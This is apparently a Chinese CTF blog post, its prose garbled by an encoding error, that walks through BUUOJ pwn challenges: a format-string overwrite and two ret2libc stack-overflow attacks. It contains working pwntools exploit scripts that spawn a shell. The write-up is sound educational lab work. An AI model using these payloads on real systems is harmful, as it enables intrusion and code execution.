<h2 id="BUUOJ-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#BUUOJ-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="BUUOJ-[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 | æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>BUUOJ-[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 | æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><p><code>checksec</code>å‘ç°å¼€äº†<code>NX</code>å’Œ<code>canary</code> å…³é—­äº†éšæœºç¡¬ä»¶åœ°å€ IDAæ‰“å¼€çœ‹çœ‹ä¸»å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;random, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == random )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æµç¨‹ä¸ºç”¨éšæœºæ•°ç”Ÿæˆå™¨ç”Ÿæˆä¸€ä¸ªåŒå­—éšæœºæ•° ç„¶åè¾“å…¥ä¸¤ä¸ªå­—ç¬¦ä¸² è¾“å…¥nameåä¼šæœ‰å›æ˜¾ è¾“å…¥passwdåä¸ç”Ÿæˆçš„éšæœºæ•°å¯¹æ¯” ç›¸åŒçš„è¯å°±èƒ½æ‹¿åˆ°shell</p>
<p>è¾“å…¥çš„ä¸¤ä¸ªå­—ç¬¦ä¸²éƒ½ä¸è¶³ä»¥è¾¾åˆ°æ ˆæº¢å‡º è€Œä¸”è¿˜å¼€å¯äº†canaryé˜²æŠ¤ æ‰€ä»¥æ€è·¯ä»ret2textè½¬å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/03/20240603-232932.png" alt="image-20240603232924979"></p>
<p>éšæœºæ•°æ˜¯bssæ®µä¸Š<code>0x804C044~0x804C047</code>çš„ä¸€ä¸ªåŒå­—å†…å­˜ å› ä¸ºæ²¡æœ‰å¼€éšæœºç¡¬ä»¶åœ°å€ æ‰€ä»¥å¯ä»¥ç›´æ¥åˆ©ç”¨<code>%n</code>æ¥ä¿®æ”¹è¿™ä¸ªå€¼</p>
<h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¦ç‚¹-å¾…è¡¥å……"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¦ç‚¹-å¾…è¡¥å……" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¦ç‚¹(å¾…è¡¥å……)"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¦ç‚¹(å¾…è¡¥å……)</h3><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">printfæ³„éœ²æ ˆä¸Šçš„å†…å­˜çš„åŸç†</a> ä»¥ä¸‹ä»‹ç»ä¸¤ä¸ªå¸¸ç”¨çš„æ¼æ´åˆ©ç”¨æ‰‹æ®µ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;xxxxx%n&quot;</span>, p)        <span class="comment">//å‡è®¾%nå‰çš„&quot;xxxxx&quot;é•¿åº¦ä¸º m bytes pæ˜¯ä¸€ä¸ªæŒ‡å‘__int64çš„æŒ‡é’ˆ é‚£ä¹ˆprintfä¸ä¼šè¾“å‡º%næˆ–è€…p è€Œæ˜¯è¾“å‡º&quot;xxxxx&quot;å¹¶å°† m èµ‹ç»™*p</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%[Num]$x&quot;</span>)            <span class="comment">//ä»¥%xçš„æ–¹å¼æ‰“å°æ ˆä¸Š&quot;%[A number]$x&quot;è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€åçš„ç¬¬Numä¸ªå†…å­˜å•å…ƒå‚¨å­˜çš„å†…å®¹</span></span><br><span class="line">                            <span class="comment">//ä¾‹å¦‚printf(&quot;%3$x&quot;, 0x10, 0x100, 0x200)ä¼šè¾“å‡º200</span></span><br></pre></td></tr></table></figure>

<p>äº†è§£äº†è¿™äº›åŸºç¡€çŸ¥è¯†å°±èƒ½åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²æ ˆä¸­çš„ä¿¡æ¯å¹¶ä¿®æ”¹å†…å­˜ äºæ˜¯ç¬¬ä¸€æ¬¡å‘é€payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + <span class="string">b&#x27;--&#x27;</span>.join([<span class="built_in">str</span>(i).encode() + <span class="string">b&#x27;:%#x&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x10</span>)])</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(sh.recvline())</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å›æ˜¾<code>b&#39;Hello,aaaa1:0xffbec598--2:0x63--3:0--4:0x3e8--5:0x3--6:0xf7fa3c08--7:0xffbec600--8:0xf7fa2ff4--9:0xc--10:0x61616161--11:0x23253a31--12:0x322d2d78--13:0x7823253a--\xf7your passwd:fail\n&#39;</code></p>
<p>å¯ä»¥çœ‹åˆ°è¾“å…¥çš„å†…å®¹å‡ºç°åœ¨äº†æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç¬¬10ä¸ªå†…å­˜å•å…ƒ é‚£ä¹ˆè¿™æ—¶å€™å¦‚æœè¾“å…¥çš„æ˜¯<code>0x804C044~0x804C047</code> é‚£ä¹ˆä»<code>%10$x</code>å¼€å§‹çš„4ä¸ªå†…å­˜å•å…ƒå­˜æ”¾çš„å°±æ˜¯<code>random</code>æ¯å­—èŠ‚çš„åœ°å€ å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™æˆ<code>%10$n</code>å¼€å§‹çš„å››ä¸ªå†…å­˜å•å…ƒå°±èƒ½æ ¹æ®è¾“å…¥çš„é•¿åº¦(å››ä¸ªå†…å­˜è¿åœ¨ä¸€èµ·å½¢æˆçš„å­—ç¬¦ä¸²çš„é•¿åº¦ å³0x10)æ¥ä¿®æ”¹randomçš„å€¼ æ‰€ä»¥ç¬¬äºŒæ¬¡å‘é€payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(<span class="number">0x804C044</span>)+p32(<span class="number">0x804C045</span>)+p32(<span class="number">0x804C046</span>)+p32(<span class="number">0x804C047</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;269488144&#x27;</span>)    <span class="comment">#0x10101010</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>å³å¯æ‹¿åˆ°shell</p>
<h2 id="BUUOJ-ciscn-2019-c-1-ret2libc"><a href="#BUUOJ-ciscn-2019-c-1-ret2libc" class="headerlink" title="BUUOJ-ciscn_2019_c_1 | ret2libc"></a>BUUOJ-ciscn_2019_c_1 | ret2libc</h2><p>ç¨‹åºæœ‰ä¸¤ä¸ªèƒ½è¾“å…¥çš„åœ°æ–¹ <code>encrypt()</code>ä¸­æœ‰æ˜æ˜¾çš„æ ˆæº¢å‡º:</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-150927.png" alt="image-20240613150920256" style="zoom: 67%;" />

<p>vmmapæŸ¥çœ‹ä¸€ä¸‹å„ä¸ªæ®µçš„æƒé™:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-151130.png" alt="image-20240613151130505"></p>
<p>æ²¡æœ‰å¯å†™å¯æ‰§è¡Œçš„æ®µ æ‰€ä»¥æ€è·¯è½¬å‘<code>ret2libc</code> é¢˜ç›®æ²¡æœ‰ç»™å¯¹åº”ç‰ˆæœ¬çš„.soåº“ æ‰€ä»¥æµ‹è¯•çš„æ—¶å€™éœ€è¦è¿ä¸Šé¶æœºè·å–ç¯å¢ƒ</p>
<p>ret2libcæ„é€ ROPçš„æ€è·¯æ˜¯ç”¨ç¨‹åºæœ¬èº«åŠ è½½åˆ°è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­çš„libcå‡½æ•°æ¥æ³„éœ²libcåœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„ç»å¯¹åŸºå€ å†é€šè¿‡åŸºå€è·å–åˆ°åŠ è½½åˆ°è™šæ‹Ÿå†…å­˜ä¸­çš„<code>system()</code>å’Œ<code>b&#39;\bin\sh&#39;</code>æ¥è·å–shellæˆ–è€…è°ƒç”¨ä»»æ„libcä¸­çš„å‡½æ•°</p>
<h3 id="GOTè¡¨å’ŒPLTè¡¨"><a href="#GOTè¡¨å’ŒPLTè¡¨" class="headerlink" title="GOTè¡¨å’ŒPLTè¡¨"></a>GOTè¡¨å’ŒPLTè¡¨</h3><p>GOTè¡¨è®°å½•äº†ç¨‹åºæ‰€ä½¿ç”¨çš„å¤–éƒ¨å‡½æ•°(libcä¸­çš„å‡½æ•°)åœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„ç»å¯¹åœ°å€ åªæœ‰åœ¨ç¨‹åºè¿è¡Œæ—¶æ‰èƒ½è·å–æ¯ä¸ªå‡½æ•°å…·ä½“çš„åœ°å€</p>
<p>PLTè¡¨æ˜¯ç”±å¤šæ®µç”¨äºè°ƒç”¨å¤–éƒ¨å‡½æ•°çš„ä»£ç å—ç»„æˆçš„ å½“ç¨‹åºè°ƒç”¨å…¶ä¸­ä¸€æ®µæ—¶è¿™æ®µä»£ç ä¼šä»GOTä¸­è·å–è¦è°ƒç”¨çš„å¤–éƒ¨å‡½æ•°çš„åœ°å€å¹¶æ‰§è¡Œ</p>
<p>è¿™ä¸ªç¨‹åºä¸­å¯ä»¥å…ˆç”¨<code>puts</code>æ¥æ³„éœ²è‡ªå·±çš„åœ°å€ä»è€Œè·å–libcçš„åŸºå€ å¯¹64ä½ç¨‹åºè¦å°†putsçš„åœ°å€ä½œä¸ºå‚æ•°è°ƒç”¨putséœ€è¦å°†GOTè¡¨ä¸­çš„putsåœ°å€å­˜æ”¾åœ¨rdiä¸­(<a target="_blank" rel="noopener" href="https://wiki.osdev.org/System_V_ABI">Linuxè°ƒç”¨çº¦å®š</a>)  è¦å°†æ ˆä¸Šçš„å†…å®¹èµ‹å€¼ç»™å¯„å­˜å™¨å°±è¦å¯»æ‰¾<code>pop rdi;ret</code>çš„gadget:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-153801.png" alt="image-20240613153801587"></p>
<p>åŒæ—¶Ubuntuç³»ç»Ÿè¦æ±‚ç¨‹åºçš„æ ˆå¹³è¡¡ retæŒ‡ä»¤çš„åœ°å€ä¹Ÿä¼šåœ¨payloadä¸­ç”¨åˆ°</p>
<p>ç¬¬ä¸€æ®µè·å–libcåŸºå€çš„payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25928</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pading = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x58</span> - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = pading + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_libc = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># print(hex(puts_libc))</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ®µç”¨äºè·å–shellçš„payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_libc)</span><br><span class="line">libc_base = puts_libc - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = pading + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>ç”±äºUbuntuâ‰¥18ç‰ˆæœ¬systemå‡½æ•°ä¸­ç”¨åˆ°<code>movaps</code>æŒ‡ä»¤è¦æ±‚æ ˆ0x10å¯¹é½ æ‰€ä»¥éœ€è¦ä¿è¯systemå‡½æ•°å…¥å£åœ°å€å­˜æ”¾åœ¨åŸè¿”å›åœ°å€åœ¨æ ˆä¸­çš„ä½ç½®çš„+0x10N bytesä½ç½® ç”¨<code>ret</code>æŒ‡ä»¤çš„åœ°å€æ¥å¡«å……ä¸­é—´éœ€è¦å¡«å……çš„ä½ç½®å³å¯</p>
<h2 id="BUUOJ-OGeek2019-babyrop-ret2libc"><a href="#BUUOJ-OGeek2019-babyrop-ret2libc" class="headerlink" title="BUUOJ-[OGeek2019]babyrop | ret2libc"></a>BUUOJ-[OGeek2019]babyrop | ret2libc</h2><p>checksecä¸€ä¸‹å¼€äº†Full RELROå’ŒNX é‚£åŸºæœ¬ä¸Šåªèƒ½è€ƒè™‘ret2libcäº†</p>
<p>ä¼ªä»£ç (åŸç¨‹åºå»æ‰äº†ç¬¦å·è¡¨):</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">handler</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Time&#x27;s up&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = input(buf);</span><br><span class="line">  vuln(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">input</span><span class="params">(<span class="type">int</span> randbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, randbytes);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x7F</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªæœ‰å½“ç¬¬ä¸€æ¬¡è¾“å…¥ä¸ç”Ÿæˆçš„éšæœºæ•°ç›¸åŒæ—¶æ‰æœ‰æœºä¼šè¿›å…¥æ¼æ´å‡½æ•° ä½†æ˜¯æ—¢ç„¶æ˜¯ç”¨<code>strncmp</code>è¿›è¡Œæ¯”è¾ƒ é‚£ä¹ˆå¯ä»¥è®©æ¯”è¾ƒçš„å­—èŠ‚æ•°ä¸º0æ¥ç»•è¿‡è¿™å±‚æ£€æµ‹å¹¶ä¿è¯è¿›å…¥æ¼æ´å‡½æ•°æ—¶è·å¾—æœ€å¤§çš„æº¢å‡ºé‡:</p>
<p><code>payload1 = b&#39;\x00\x00\x00\x00\x00\x00\x00\xff&#39;</code></p>
<p>ç„¶åæ„é€ æ³„éœ²libcåŸºå€çš„ROP è¿™é‡Œçš„æ€è·¯æ˜¯åˆ©ç”¨åœ¨<code>handler()</code>ä¸­ä½¿ç”¨äº†<code>puts</code>è¿™ä¸€ç‚¹æ¥æ³„éœ²libc å¾—åˆ°libcåŸºå€åå†å›åˆ°æ¼æ´å‡½æ•°è¿›è¡Œæœ€åä¸€æ¬¡è¾“å…¥æ¥è°ƒç”¨<code>system(&#39;/bin/sh&#39;)</code> éœ€è¦æ³¨æ„çš„æ˜¯ç¨‹åºæ˜¯32ä½çš„ å‚æ•°å­˜æ”¾åœ¨æ ˆä¸­:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_ret = p32(<span class="number">0x8048889</span>)</span><br><span class="line">vuln_func = p32(<span class="number">0x80487D0</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xE7</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">payload2 = padding + p32(puts_plt) + vuln_func + p32(puts_got) + p32(<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€æ¬¡å‘é€æ•°æ®çš„æ—¶å€™å› ä¸ºç¡¬è¦ç”¨LibcSearcheræ¥çŒœlibcç‰ˆæœ¬å¡äº†ä¸€ä¼š å®é™…ä¸Šé¢˜ç›®ç»™äº†libcç‰ˆæœ¬åå¯ä»¥ç›´æ¥ç”¨IDAåœ¨å…¶ä¸­æ‰¾åˆ°putså‡½æ•°çš„ç›¸å¯¹åç§»ä»¥è®¡ç®—libc è·å¾—<code>system</code>å’Œ<code>b&#39;//bin//sh&#39;</code>çš„åœ°å€ä¹Ÿæ˜¯åŒç†ç›´æ¥åœ¨libcé‡Œé¢æ‰¾ æ®æ­¤æ„é€ ç¬¬ä¸‰ä¸ªpayload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base = puts_addr - <span class="number">0x5F140</span></span><br><span class="line">system = base + <span class="number">0x3A940</span></span><br><span class="line">binsh = base + <span class="number">0x15902B</span></span><br><span class="line"></span><br><span class="line">payload3 = padding + p32(system) + main_ret + p32(binsh)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-ciscn-2019-ne-5-ç®€å•canary"><a href="#BUUOJ-ciscn-2019-ne-5-ç®€å•canary" class="headerlink" title="BUUOJ-ciscn_2019_ne_5 | ç®€å•canary"></a>BUUOJ-ciscn_2019_ne_5 | ç®€å•canary</h2><p>åªå¼€äº†NXé˜²æŠ¤ åŸºæœ¬ä¸ç”¨è€ƒè™‘ret2shellcodeäº† ä¸»å‡½æ•°æ²¡æœ‰æ‰¾åˆ°å¯ä»¥æ“ä½œçš„éƒ¨åˆ† ç›´æ¥çœ‹æ¼æ´å‡½æ•°</p>
